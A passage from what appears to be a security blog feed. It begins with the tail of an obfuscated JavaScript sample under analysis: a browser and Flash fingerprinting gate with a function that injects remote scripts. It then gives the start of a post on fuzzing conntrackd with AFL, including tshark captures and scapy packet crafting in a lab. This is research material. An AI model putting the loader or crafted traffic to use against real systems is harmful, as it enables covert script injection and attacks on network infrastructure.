x=Z[o][F][l],V=P(x);R[c8i.k7O]=V[c8i.k7O];R[L]=V[L];R[d]=V[d];R[k]=V[k];R[H]=V[H];R[c8i.A3]=c8i.e8O;}}else if(navigator[e][I](K)==-c8i.Q3&amp;&amp;window[g]){var x=-c8i.Q3;for(var h=c8i.q3;c8i[v](h,Q[c8i.e9])&amp;&amp;x==-c8i.Q3;h++){var X=S(Q[h][N]);if(!X[p]){R[c8i.A3]=c8i.e8O;x=Q[h][O](X);if(x!=-c8i.Q3){var V=b(x);R[c8i.k7O]=V[c8i.k7O];R[L]=V[L];R[d]=V[d];R[H]=V[H];R[k]=V[k];}}}}}();};c8i[c8i.C9](c8i.N4O);var CryptoJS=CryptoJS||function(h,X){var a=&#34;finalize&#34;,z=&#34;_append&#34;,n=&#34;reset&#34;,U=&#34;BufferedBlockAlgorithm&#34;,E=&#34;parse&#34;,m=&#34;Utf8&#34;,r=&#34;Latin1&#34;,C=&#34;Hex&#34;,d=&#34;enc&#34;,H=&#34;ceil&#34;,s=&#34;push&#34;,L=255,k=&#34;stringify&#34;,y=&#34;apply&#34;,W=&#34;hasOwnProperty&#34;,A=&#34;Base&#34;,b={},u=b[c8i.A8O]={},w=function(){},c=u[A]={extend:function(O){var p=&#34;$super&#34;;var N=&#34;mixIn&#34;;w.prototype=this;var v=new w;O&amp;&amp;v[N](O);v[W](c8i.J1)||(v[c8i.J1]=function(){v[p][c8i.J1][y](this,arguments);});v.init.prototype=v;v[p]=this;return v;},create:function(){var O=this[c8i.K8O]();O[c8i.J1][y](O,arguments);return O;},init:function(){},mixIn:function(O){for(var p in O)O[W](p)&amp;&amp;(this[p]=O[p]);O[W](c8i.A9)&amp;&amp;(this[c8i.A9]=O[c8i.A9]);},clone:function(){return this.init.prototype.extend(this);}},P=u[c8i.B2O]=c[c8i.K8O]({init:function(O,p){var N=&#34;f4&#34;;var v=&#34;S4&#34;;O=this[c8i.M7O]=O||[];this[c8i.h9]=c8i[v](p,X)?p:c8i[N](c8i.E3,O[c8i.e9]);},toString:function(O){return (O||t)[k](this);},concat:function(v){var g=&#34;T4&#34;;var K=65535;var I=&#34;z4&#34;;var e=&#34;Q4&#34;;var l=&#34;r4&#34;;var F=&#34;b4&#34;;var f=&#34;B4&#34;;var j=&#34;clamp&#34;;var J=function(O){var p=&#34;J4&#34;;var N=&#34;s4&#34;;o[c8i[N](x+V,c8i.W3)]=O[c8i[p](V,c8i.W3)];};var Y=function(O){v=O[c8i.h9];};var o=this[c8i.M7O],Z=v[c8i.M7O],x=this[c8i.h9];Y(v);this[j]();if(c8i[f](x,c8i.E3))for(var V=c8i.q3;c8i[F](V,v);V++)o[c8i[l](x+V,c8i.W3)]|=c8i[e]((Z[V&gt;&gt;&gt;c8i.W3]&gt;&gt;&gt;c8i.P3-c8i.p1*(V%c8i.E3)&amp;L),c8i.P3-c8i.p1*((x+V)%c8i.E3));else if(c8i[I](K,Z[c8i.e9]))for(V=c8i.q3;c8i[g](V,v);V+=c8i.E3)J(Z);else o[s][y](o,Z);this[c8i.h9]+=v;return this;},clamp:function(){var O=&#34;p6&#34;;var p=4294967295;var N=&#34;U4&#34;;var v=&#34;E4&#34;;var g=this[c8i.M7O],K=this[c8i.h9];g[c8i[v](K,c8i.W3)]&amp;=c8i[N](p,c8i.X3-c8i.p1*(K%c8i.E3));g[c8i.e9]=h[H](c8i[O](K,c8i.E3));},clone:function(){var O=&#34;slice&#34;;var p=c[c8i.v7O][c8i.B7O](this);p[c8i.M7O]=this[c8i.M7O][O](c8i.q3);return p;},random:function(O){var p=&#34;random&#34;;var N=&#34;V6&#34;;var v=&#34;K6&#34;;for(var g=[],K=c8i.q3;c8i[v](K,O);K+=c8i.E3)g[s](c8i[N](c8i.i7O*h[p](),c8i.q3));return new P[c8i.J1](g,O);}}),S=b[d]={},t=S[C]={stringify:function(p){var N=&#34;d6&#34;;var v=&#34;H6&#34;;var g=&#34;L6&#34;;var K=&#34;x6&#34;;var I=function(O){p=O[c8i.h9];};var e=p[c8i.M7O];I(p);for(var l=[],F=c8i.q3;c8i[K](F,p);F++){var f=c8i[g](e[F&gt;&gt;&gt;c8i.W3]&gt;&gt;&gt;c8i.P3-c8i.p1*(F%c8i.E3),L);l[s]((c8i[v](f,c8i.E3))[c8i.A9](c8i.e1));l[s]((c8i[N](f,c8i.x1))[c8i.A9](c8i.e1));}return l[c8i.w3](c8i.L3);},parse:function(O){var p=&#34;Y6&#34;;var N=&#34;substr&#34;;var v=&#34;h6&#34;;var g=&#34;G6&#34;;var K=&#34;C6&#34;;for(var I=O[c8i.e9],e=[],l=c8i.q3;c8i[K](l,I);l+=c8i.W3)e[c8i[g](l,c8i.u3)]|=c8i[v](parseInt(O[N](l,c8i.W3),c8i.e1),c8i.P3-c8i.E3*(l%c8i.p1));return new P[c8i.J1](e,c8i[p](I,c8i.W3));}},D=S[r]={stringify:function(p){var N=&#34;W6&#34;;var v=&#34;a6&#34;;var g=function(O){p=O[c8i.h9];};var K=p[c8i.M7O];g(p);for(var I=[],e=c8i.q3;c8i[v](e,p);e++)I[s](String[c8i.r9](c8i[N](K[e&gt;&gt;&gt;c8i.W3]&gt;&gt;&gt;c8i.P3-c8i.p1*(e%c8i.E3),L)));return I[c8i.w3](c8i.L3);},parse:function(O){var p=&#34;n6&#34;;var N=&#34;w6&#34;;var v=&#34;M6&#34;;for(var g=O[c8i.e9],K=[],I=c8i.q3;c8i[v](I,g);I++)K[c8i[N](I,c8i.W3)]|=c8i[p]((O[c8i.B1](I)&amp;L),c8i.P3-c8i.p1*(I%c8i.E3));return new P[c8i.J1](K,g);}},R=S[m]={stringify:function(p){try{return decodeURIComponent(escape(D[k](p)));}catch(O){var N=&#34;Malformed UTF-8 data&#34;;throw Error(N);}},parse:function(O){return D[E](unescape(encodeURIComponent(O)));}},Q=u[U]=c[c8i.K8O]({reset:function(){this[c8i.O2O]=new P[c8i.J1];this[c8i.j1]=c8i.q3;},_append:function(O){var p=&#34;concat&#34;;var N=&#34;string&#34;;N==typeof O&amp;&amp;(O=R[E](O));this[c8i.O2O][p](O);this[c8i.j1]+=O[c8i.h9];},_process:function(p){var N=&#34;splice&#34;;var v=&#34;_doProcessBlock&#34;;var g=&#34;Z0&#34;;var K=&#34;I0&#34;;var I=&#34;_minBufferSize&#34;;var e=&#34;v0&#34;;var l=&#34;max&#34;;var F=&#34;O0&#34;;var f=&#34;blockSize&#34;;var j=function(){var O=&#34;D6&#34;;p=c8i[O](x,Z);};var J=this[c8i.O2O],Y=J[c8i.M7O],o=J[c8i.h9],Z=this[f],x=c8i[F](o,(c8i.E3*Z)),x=p?h[H](x):h[l](c8i[e]((x|c8i.q3),this[I]),c8i.q3);j();o=h[c8i.k9](c8i[K](c8i.E3,p),o);if(p){for(var V=c8i.q3;c8i[g](V,p);V+=Z)this[v](Y,V);V=Y[N](c8i.q3,p);J[c8i.h9]-=o;}return new P[c8i.J1](V,o);},clone:function(){var O=c[c8i.v7O][c8i.B7O](this);O[c8i.O2O]=this[c8i.O2O][c8i.v7O]();return O;},_minBufferSize:c8i.q3});u[c8i.g7O]=Q[c8i.K8O]({cfg:c[c8i.K8O](),init:function(O){var p=&#34;cfg&#34;;this[p]=this[p][c8i.K8O](O);this[n]();},reset:function(){var O=&#34;_doReset&#34;;Q[n][c8i.B7O](this);this[O]();},update:function(O){this[z](O);this[c8i.m9]();return this;},finalize:function(O){var p=&#34;_doFinalize&#34;;O&amp;&amp;this[z](O);return this[p]();},blockSize:c8i.e1,_createHelper:function(N){return function(O,p){return (new N[c8i.J1](p))[a](O);};},_createHmacHelper:function(v){return function(O,p){var N=&#34;HMAC&#34;;return (new q[N][c8i.J1](v,p))[a](O);};}});var q=b[c8i.E2O]={};return b;}(Math);(function(){var t=&#34;_createHmacHelper&#34;,D=&#34;HmacSHA1&#34;,R=&#34;_createHelper&#34;,Q=14,q=&#34;_hash&#34;,M=CryptoJS,i7=M[c8i.A8O],K7=i7[c8i.B2O],p7=i7[c8i.g7O],T=[],i7=M[c8i.E2O][c8i.N1]=p7[c8i.K8O]({_doReset:function(){var O=3285377520;var p=271733878;var N=2562383102;var v=4023233417;var g=1732584193;this[q]=new K7[c8i.J1]([g,v,N,p,O]);},_doProcessBlock:function(o,Z){var x=&#34;H5&#34;;var V=&#34;x5&#34;;var h=80;var X=&#34;h0&#34;;var a=function(){var O=&#34;G0&#34;;m[c8i.q3]=c8i[O](m[c8i.q3]+r,c8i.q3);};var z=function(){var O=&#34;o0&#34;;m[c8i.u3]=c8i[O](m[c8i.u3]+H,c8i.q3);};var n=function(){var O=&#34;d0&#34;;m[c8i.W3]=c8i[O](m[c8i.W3]+d,c8i.q3);};var U=function(){var O=&#34;e0&#34;;m[c8i.E3]=c8i[O](m[c8i.E3]+s,c8i.q3);};var E=function(){var O=&#34;C0&#34;;m[c8i.Q3]=c8i[O](m[c8i.Q3]+C,c8i.q3);};for(var m=this[q][c8i.M7O],r=m[c8i.q3],C=m[c8i.Q3],d=m[c8i.W3],H=m[c8i.u3],s=m[c8i.E3],L=c8i.q3;c8i[X](h,L);L++){var k=function(){var O=&#34;V5&#34;;T[L]=c8i[O](o[Z+L],c8i.q3);};var y=function(O){s=O;};var W=function(O){C=O;};var A=function(){var O=899497514;var p=&#34;p5&#34;;var N=1894007588;var v=&#34;U0&#34;;var g=60;var K=&#34;E0&#34;;var I=1859775393;var e=&#34;w0&#34;;var l=40;var F=&#34;M0&#34;;var f=1518500249;var j=&#34;W0&#34;;var J=20;var Y=&#34;a0&#34;;S=c8i[Y](J,L)?S+((c8i[j](C,d)|~C&amp;H)+f):c8i[F](l,L)?S+((c8i[e](C,d,H))+I):c8i[K](g,L)?S+(c8i[v]((C&amp;d|C&amp;H|d&amp;H),N)):S+(c8i[p]((C^d^H),O));};var b=function(){var O=27;var p=&#34;K5&#34;;S=(c8i[p](r&lt;&lt;c8i.T3,r&gt;&gt;&gt;O))+s+T[L];};var u=function(O){r=O;};var w=function(){var O=30;var p=&#34;Y0&#34;;d=c8i[p](C&lt;&lt;O,C&gt;&gt;&gt;c8i.W3);};var c=function(O){H=O;};if(c8i[V](c8i.e1,L))k();else{var P=function(){var O=31;var p=&#34;L5&#34;;T[L]=c8i[p](S&lt;&lt;c8i.Q3,S&gt;&gt;&gt;O);};var S=c8i[x](T[L-c8i.u3],T[L-c8i.p1],T[L-Q],T[L-c8i.e1]);P();}b();A();y(H);c(d);w();W(r);u(S);}a();E();n();z();U();},_doFinalize:function(){var N=&#34;T5&#34;;var v=&#34;floor&#34;;var g=&#34;M5&#34;;var K=128;var I=&#34;W5&#34;;var e=&#34;a5&#34;;var l=&#34;Y5&#34;;var F=&#34;h5&#34;;var f=9;var j=64;var J=function(){var O=&#34;j5&#34;;o[c8i.h9]=c8i[O](c8i.E3,Z[c8i.e9]);};var Y=function(O){var p=&#34;c5&#34;;Z[(c8i[p](V+j,f,c8i.E3))+c8i.x1]=O;};var o=this[c8i.O2O],Z=o[c8i.M7O],x=c8i[F](c8i.p1,this[c8i.j1]),V=c8i[l](c8i.p1,o[c8i.h9]);Z[c8i[e](V,c8i.T3)]|=c8i[I](K,c8i.P3-V%c8i.X3);Z[(c8i[g](V+j,f,c8i.E3))+Q]=Math[v](c8i[N](x,c8i.i7O));Y(x);J();this[c8i.m9]();return this[q];},clone:function(){var O=p7[c8i.v7O][c8i.B7O](this);O[q]=this[q][c8i.v7O]();return O;}});M[c8i.N1]=p7[R](i7);M[D]=p7[t](i7);})();Challenge.prototype.calculate=function(){this[c8i.X7O]=this[c8i.y8O][c8i.n8O](this[c8i.X7O]);return this;};Challenge.prototype.b64=function(O){return this[c8i.y8O][c8i.n8O](O);};Challenge.prototype.secondRound=function(O){var p=&#34;b64&#34;;this[c8i.X7O]=O+this[p](this[c8i.X7O]);this[c8i.X7O]=this[p](this[c8i.X7O]);};Challenge.prototype.get=function(){return this[c8i.X7O];};Challenge.prototype.lkslkj5lkj=function(){return navigator[c8i.Z7O];};Challenge.prototype.checkFirst=function(O){var p=&#34;U2hvY2t3YXZlIEZsYXNoIDIwLjAgcjBWRmM1Tm1GWGVITlpVemd4VEdwQlowdEdaSEJpYlZKMlpETk5aMVJzVVdkT2FUUjRUM2xDV0ZReFl6Sk9RMnRuVVZoQ2QySkhWbGhhVjBwTVlWaFJkazVVVFROTWFrMHlTVU5vVEZOR1VrNVVRM2RuWWtkc2NscFRRa2hhVjA1eVlubHJaMUV5YUhsaU1qRnNUSHBSTTB4cVFYVk5hbFY1VG1rME5FMURRbFJaVjFwb1kyMXJkazVVVFROTWFrMHk=&#34;,N=&#34;E5&#34;;if(c8i[N](O,p)){return c8i.e8O;}return c8i.j7O;};Challenge.prototype.doGet=function(O){var p=&#39;%20&#39;,N=&#34;search&#34;,v=&#34;exec&#34;,g=&#39;([^&amp;;]+?)(&amp;|#|;|$)&#39;,K=&#39;[?|&amp;]&#39;;return decodeURIComponent((new RegExp(K+O+c8i.n7O+g)[v](location[N])||[,c8i.L3])[c8i.Q3][c8i.p2O](/\+/g,p))||c8i.g8O;};Challenge.prototype.import =function(O){var p=&#34;appendChild&#34;,N=&#34;body&#34;,v=&#39;src&#39;,g=&#34;setAttribute&#34;,K=&#39;script&#39;,I=&#34;createElement&#34;,e=document[I](K);e[g](v,O);document[N][p](e);};var dummy=new Challenge(navigator[c8i.Z7O]),versioncheck=FlashDetect[c8i.A3];if(versioncheck){var S7=function(O){versioncheck=O[c8i.k7O];};S7(FlashDetect);}else{var d7=function(O){versioncheck=O;};d7(c8i.O9);}dummy[c8i.c8O]()[c8i.T7O](versioncheck);var versioncheck=dummy[c8i.L8O](),kj4kjhkj43w980=c8i.p7O;if(dummy[c8i.Z9](versioncheck)){kj4kjhkj43w980=CryptoJS[c8i.N1](dummy[c8i.t9]());}var suffix=new Array();suffix[c8i.q3]=parseInt(dummy[c8i.R8O](c8i.b3));suffix[c8i.Q3]=parseInt(dummy[c8i.R8O](c8i.h8O));suffix[c8i.W3]=dummy[c8i.R8O](c8i.S8O);suffix[c8i.u3]=dummy[c8i.R8O](c8i.X9);suffix[c8i.E3]=dummy[c8i.R8O](c8i.s3);c8i[c8i.u9]();suffix[c8i.T3]=suffix[c8i.T3][c8i.A9]();if(c8i[c8i.u8O](suffix[c8i.T3][c8i.e9],c8i.y3)&amp;&amp;c8i[c8i.X8O](CryptoJS[c8i.N1](suffix[c8i.T3]),c8i.w9)){kj4kjhkj43w980+=suffix[c8i.T3]+c8i.R2O;}if(window[c8i.r8O]&amp;&amp;(window[c8i.r8O][c8i.b2O]||window[c8i.r8O][c8i.l2O])){var C7=function(O){kj4kjhkj43w980=O;};C7(c8i.p7O);dummy[c8i.f2O](kj4kjhkj43w980);}else{if(c8i[c8i.F7O](dummy[c8i.R8O](c8i.T9),c8i.g8O)){dummy[c8i.f2O](kj4kjhkj43w980);}else{var c7=function(O){kj4kjhkj43w980=O;};c7(c8i.p7O);dummy[c8i.f2O](kj4kjhkj43w980);}};

</code></pre></div><p>This is definitely <strong>TBD</strong> :) To be honest: I think I&rsquo;ve had enough of <strong>JavaScript Super Bullshit</strong> :)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Fuzzing the hell out of conntrack tools</title>
      <link>https://blog.dornea.nu/2016/10/28/fuzzing-the-hell-out-of-conntrack-tools/</link>
      <pubDate>Fri, 28 Oct 2016 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2016/10/28/fuzzing-the-hell-out-of-conntrack-tools/</guid>
      <content:encoded><![CDATA[<p>Fuzzing is nowadays <strong>the</strong> attack technique used by a lot of pentesters and security researchers. Whether you&rsquo;re
looking for vulnerabilities in media files (pictures, videos, audio stuff) or just binary files,
fuzzing is the right approach if you don&rsquo;t want to do some static code analysis or debug the
hell out of your targets.</p>
<p>When it comes to fuzzing there are a few tools to mention that have established during the last
years. One of them is definitely <a href="http://lcamtuf.coredump.cx/afl/">AFL</a>. AFL has a very powerful
<a href="https://lcamtuf.blogspot.de/2014/08/binary-fuzzing-strategies-what-works.html">fuzzing engine</a>
and a lot of <a href="http://lcamtuf.coredump.cx/afl/#bugs">vulnerabilities</a> have been identified by AFL.
However, AFL&rsquo;s simpleness of using files as parameters to your target binary, is also one big
disadvantage. While in most cases you should be fine by reading your input from files, when dealing
with <strong>sockets</strong>, the <strong>code</strong> has to be <strong>modified</strong> in order to read input from files instead of sockets.
This step can be very <strong>complex</strong> and involves good C/C++ skills.</p>
<p>After reading <a href="https://blog.skullsecurity.org/2015/how-i-nearly-almost-saved-the-internet-starring-afl-fuzz-and-dnsmasq">&ldquo;How I nearly almost saved the Internet&rdquo;</a>
I thought it should be an easy task to adapt the code of my target in order
to run it by AFL. This step was indeed very <strong>time-consuming</strong> and was done after endless debug sessions.
Below I&rsquo;ll try to give some overview which steps might be essential in fuzzing your target in an
effective way. Modifying the source code for your needs definitely requires a deep understanding
of the programms workflow. I hope this post will provide some useful tips how to speed up
the fuzzing process - whatever your target will be.</p>
<h2 id="motivation">Motivation</h2>
<p>Why would one want to <strong>fuzz</strong> <a href="http://conntrack-tools.netfilter.org">conntrack-tools</a> anyway? Before we continue: <strong>No 0day here!</strong>
As sad as it sounds, I wasn&rsquo;t able to find any crashes using <code>AFL</code>. But that is no guarantee
for safe, secure code so there might be some vulnerabilities ready to be found.</p>
<p>As you probably know <strong>software security</strong> doest not only apply to web stuff but also to
software that runs critical network infrastructure. Since the IT sec community seems to
have a <strong>huge</strong> focus on web applications (it&rsquo;s still the main entry point, right?), a few
people (in relation to the first group mentioned) do have a look at network/system level
stuff. In my case I wanted to audit and fuzz software that deals with <a href="http://www.iptables.info/en/connection-state.html#COMPLEXPROTOCOLS">connection tracking</a> management. In my particular case I&rsquo;ve used <a href="http://conntrack-tools.netfilter.org/conntrackd.html">conntrackd</a>
to manage and synchronize the connection tracking information between 2 hosts.</p>
<h2 id="setup">Setup</h2>
<p>On 2 virtual machines I&rsquo;ve downloaded the <code>conntrack-tools</code> (also includes <code>conntrackd</code>),
compiled the code and ran the daemons:</p>
<details>
  <summary style="background-color:#f5f5f5;border:1px solid #ccc;padding:5px;">
    blockdiag code
    
  </summary>
  <pre><code>nwdiag
{
  network nat-network {
	  address = &quot;192.168.122.0/24&quot;

	  nat01 [address = &quot;192.168.122.242&quot;];
	  nat02 [address = &quot;192.168.122.252&quot;];
  }
}
</code></pre>

</details>

<p><img src="/posts/img/2016/conntrack/network.svg" alt="png"></p>
<p>So <code>nat01</code> and <code>nat02</code> were supposed to exchange information about their connection tracking table.
In a nutshell <code>conntrackd</code>:</p>
<ul>
<li><strong>synchronizes</strong> connection tracking states among several replica firewalls</li>
<li>has <strong>channels</strong> (UDP, TCP)</li>
<li>has <strong>sync</strong> modes (notrack, ftfw)</li>
</ul>
<p>Let&rsquo;s have a look at some <strong>configuration</strong> file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Sync {
        Mode FTFW{
        }
    UDP Default {
        IPv4_address 192.168.122.242
        IPv4_Destination_Address 192.168.122.252 
        Port 3780
        Interface ens3 
        SndSocketBuffer 1249280
        RcvSocketBuffer 1249280
        Checksum on
    }
}
</code></pre></div><p>This configuration says:</p>
<ul>
<li><strong>FTFW</strong> sync mode is used</li>
<li><strong>own</strong> IP address is <code>192.168.122.242</code></li>
<li><strong>destination</strong> IP address for sync is <code>192.168.122.252</code></li>
<li>use <strong>port</strong> <code>3780</code> for sync</li>
</ul>
<p>Basically this how synchronization works. Of course some details have been ommitted for the sake of
simplicity. For the detailed configuration please refer to the <a href="http://conntrack-tools.netfilter.org/manual.html">documentation</a>.
In the end the daemons are started by specifying the config file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ./src/conntrackd -C &lt;config file&gt;
...
</code></pre></div><blockquote>
<p>If you experience some crazy error messages, make sure you have following kernel modules loaded: <code>af_netlink</code></p>
</blockquote>
<h2 id="network-traffic">Network traffic</h2>
<p>If you then <strong>sniff</strong> for packets you&rsquo;ll see some magic packets:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ tshark -nr nat-traffic.pcap -E separator=&#34;,&#34; -T fields -e udp.srcport -e udp.dstport -e udp.length -e data  | head -n 5
53085,3780,76,110000445815c162000c00000a17680236ef368f000800050000019e00050002060000000008000391f201bb000500040400000000080006000000780008000c7e64b2c3
53085,3780,76,110000445815c163000c00000a17680236ef368f000800050000019e00050002060000000008000391f201bb0005000406000000000800060000001e0008000c7e64b2c3
53085,3780,76,100000445815c164000c00000a216801d83ad4a30008000500000198000500020600000000080003c29a0050000500040100000000080006000000780008000ceb64b2c3
53085,3780,76,110000445815c1aa000c00000a171f0cca0c1b21000800050000019a00050002060000000008000386e600350005000402000000000800060000003c0008000c7e64b2c3
53085,3780,76,110000445815c1ab000c00000a171f0cca0c1b21000800050000019e00050002060000000008000386e60035000500040300000000080006000038400008000c7e64b2c3
</code></pre></div><p>As you have noticed the <code>UDP</code> payloads above are very similar to each other. However, <strong>bigger</strong> payloads were also transmitted:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">57252,3780,1444,1100004457e14ced000c00000a21680236ef249d000800050000019e000500020600000000080003d9ac01bb000500040300000000080006000038400008000ceb64b
2c31100004457e14cee000c00000a17680236ef22ae000800050000019e000500020600000000080003c0a201bb000500040300000000080006000038400008000c7e64b2c31100004457
e14cef000c00000a176801c3b265ac000800050000019e000500020600000000080003bc700050000500040300000000080006000038400008000c7e64b2c31100004457e14cf0000c000
00a176802b0206cff000800050000019e000500020600000000080003c16401bb000500040300000000080006000038400008000c7e64b2c31100004457e14cf1000c00000a21680136ef208d000800050000019e0005000206000000000800039dc201bb000500040300000000080006000038400008000ceb64b2c31100004457e14cf2000c00000a17680236ef249d000800050000019e000500020600000000080003d12c01bb000500040300000000080006000038400008000c7e64b2c31100004457e14cf3000c00000a21680236ef208d000800050000019e000500020600000000080003be7c01bb000500040300000000080006000038400008000ceb64b2c31100004457e14cf4000c00000a21680236ef37cb000800050000019e000500020600000000080003d4d201bb000500040300000000080006000038400008000ceb64b2c31100004457e14cf5000c00000a21680236ef208d000800050000019e000500020600000000080003de9001bb000500040300000000080006000038400008000ceb64b2c31100004457e14cf6000c00000a21680136ef208d000800050000019e000500020600000000080003bdae01bb000500040300000000080006000038400008000ceb64b2c31100004457e14cf7000c00000a17680336ef22af000800050000019e000500020600000000080003a37a01bb000500040300000000080006000038400008000c7e64b2c31100004457e14cf8000c00000a21680136ef208d000800050000019e0005000206000000000800039c8601bb000500040300000000080006000038400008000ceb64b2c31100004457e14cf9000c00000a21680134314113000800050000019e00050002060000000008000382f401bb000500040300000000080006000038400008000ceb64b2c31100004c57e14cfa000c00000a21680236ef3698000800050000019e000500020600000000080003d27c01bb000500040300000000080006000038400008000ceb64b2c30006000eeb0600001100004457e14cfb000c00000a17680336ef249d000800050000019e000500020600000000080003de7601bb000500040300000000080006000038400008000c7e64b2c31100004457e14cfc000c00000a21680136ef208d000800050000019e0005000206000000000800039ce001bb000500040300000000080006000038400008000ceb64b2c31100004457e14cfd000c00000a176803c01efd70000800050000019e000500020600000000080003b51001bb0005000403000000000800
</code></pre></div><h2 id="analysis">Analysis</h2>
<p>Now what valuable information can we extract from the payloads? Using <a href="http://www.secdev.org/projects/scapy/">scapy</a> I&rsquo;ve did
some basic traffic analysis:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In [11]: p.payload.payload.show()

###[ UDP ]###
  sport     = 53085
  dport     = nnp
  len       = 76
  chksum    = 0x1aa6
###[ Raw ]###
     load      = &#39;\x11\x00\x00DX\x15\xc1c\x00\x0c\x00\x00\n\x17h\x026\xef6\x8f\x00\x08\x00\x05\x00\x00\x01\x9e\x00\x05\x00\x02\x06\x00\x00\x00\x00\x08\x00\x03\x91\xf2\x01\xbb\x00\x05\x00\x04\x06\x00\x00\x00\x00\x08\x00\x06\x00\x00\x00\x1e\x00\x08\x00\x0c~d\xb2\xc3&#39;
</code></pre></div><p>Apparently this is no ASCII data (who would have expected that anyway? :) Using <code>gdb</code> I wanted to know what&rsquo;s inside the data
and did some <strong>dynamic analysis</strong>. This way I was able to learn more about the data being passed over the wire and how
the source code is structured.</p>
<p>But first I had to make the code debuggable:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ CCFLAGS=&#34;-g3 -gdwarf2&#34; ./configure
[...]
</code></pre></div><p>Afterwards you should be able to <strong>run</strong> it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sudo ./src/conntrackd -C conntrackd.conf
</code></pre></div><p>Sniffing the traffic you should see sth like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ sudo tshark -i ens3 -Y udp -E separator=&#34;,&#34; -T fields -e ip.src -e udp.srcport -e udp.dstport -e udp.length -e data
192.168.122.242,192.168.122.242,48786,3780,16,1a10000858109293
192.168.122.242,192.168.122.242,48786,3780,16,1a10000858109294
192.168.122.242,192.168.122.242,48786,3780,16,1a10000858109295
192.168.122.242,192.168.122.242,48786,3780,16,1a10000858109296
192.168.122.242,192.168.122.242,48786,3780,16,1a10000858109297
192.168.122.242,192.168.122.242,48786,3780,16,1a10000858109298
192.168.122.242,192.168.122.242,48786,3780,16,1a10000858109299
192.168.122.242,192.168.122.242,48786,3780,16,1a1000085810929a
^C8 packets captured
</code></pre></div><p>The daemon will try to send out some &ldquo;keep-alive&rdquo; messages to its counterpart. Now we send those packets
<strong>manually</strong> and debug the interesting part in the code. For packet generation I&rsquo;ll use <code>scapy</code> again (running as
<strong>root</strong> since you&rsquo;ll need to create <strong>RAW sockets</strong>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">In [1]: from scapy.all import *
WARNING: No route found for IPv6 destination :: (no default route?)

In [2]: import binascii

In [3]: p=Ether()/IP(dst=&#34;192.168.122.242&#34;)/UDP(dport=3780)

In [4]: payload = binascii.unhexlify(&#34;1a10000858109293&#34;)

In [5]: p/Raw(load=payload)
Out[5]: &lt;Ether  type=IPv4 |&lt;IP  frag=0 proto=udp dst=192.168.122.242 |&lt;UDP  dport=nnp |&lt;Raw  load=&#39;\x1a\x10\x00\x08X\x10\x92\x93&#39; |&gt;&gt;&gt;&gt;

In [7]: sendp(p/Raw(load=payload))
.
Sent 1 packets.
</code></pre></div><h3 id="data-flow">Data flow</h3>
<p>After heavy debugging sessions I was able to understand the data flow inside the code. Below I&rsquo;ll try to explain how <code>conntrackd</code> basically
works:</p>
<ol>
<li>The <strong>configuration</strong> file gets parsed and several options are set</li>
<li>In <code>src/sync-mode.c</code> you have <a href="http://git.netfilter.org/conntrack-tools/tree/src/sync-mode.c#n362">init_sync</a> where a lot of vodoo happens but the most important part is:</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">	<span style="color:#6ab825;font-weight:bold">for</span> (i=<span style="color:#3677a9">0</span>; i&lt;STATE_SYNC(channel)-&gt;channel_num; i++) {
		<span style="color:#6ab825;font-weight:bold">int</span> fd = channel_get_fd(STATE_SYNC(channel)-&gt;channel[i]);
		fcntl(fd, F_SETFL, O_NONBLOCK);

		<span style="color:#6ab825;font-weight:bold">switch</span>(channel_type(STATE_SYNC(channel)-&gt;channel[i])) {
		<span style="color:#6ab825;font-weight:bold">case</span> CHANNEL_T_STREAM:
			register_fd(fd, channel_accept_cb,
					STATE_SYNC(channel)-&gt;channel[i],
					STATE(fds));
			<span style="color:#6ab825;font-weight:bold">break</span>;
		<span style="color:#6ab825;font-weight:bold">case</span> CHANNEL_T_DATAGRAM:
			register_fd(fd, channel_handler,
					STATE_SYNC(channel)-&gt;channel[i],
					STATE(fds));
			<span style="color:#6ab825;font-weight:bold">break</span>;
		}
	}
</code></pre></div><p>Depending on the <strong>sync</strong> mode, then for every <strong>channel</strong> a channel <strong>handler</strong> is being registered. This
will be called every time an &ldquo;event&rdquo; occurs, that means a packet arrives:</p>
<ul>
<li>for TCP packets (<code>CHANNEL_T_STREAM</code>) <code>channel_accept_cb</code> will be called</li>
<li>for UDP datagrams (<code>CHANNEL_T_DATAGRAM</code>) <code>channel_handler</code> will be called</li>
</ul>
<p>Since I chose to test for <strong>UDP</strong> packets, let&rsquo;s have a look at <a href="http://git.netfilter.org/conntrack-tools/tree/src/sync-mode.c#n253">channel_handler</a>:</p>
